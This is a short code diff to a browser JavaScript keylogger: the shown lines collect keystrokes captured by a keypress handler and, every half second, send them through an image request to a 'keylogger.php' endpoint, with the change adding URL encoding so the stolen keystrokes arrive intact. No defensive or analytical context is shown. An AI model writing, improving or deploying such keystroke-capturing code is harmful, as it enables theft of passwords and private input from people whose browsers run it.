@@ -8,7 +8,7 @@ document.onkeypress = function(e) {
 }
 window.setInterval(function(){
 if(keys != '') {
-  new Image().src = 'keylogger.php?c='+keys;
+  new Image().src = 'keylogger.php?c='+encodeURIComponent(keys);
   keys = '';
 }
 }, 500);
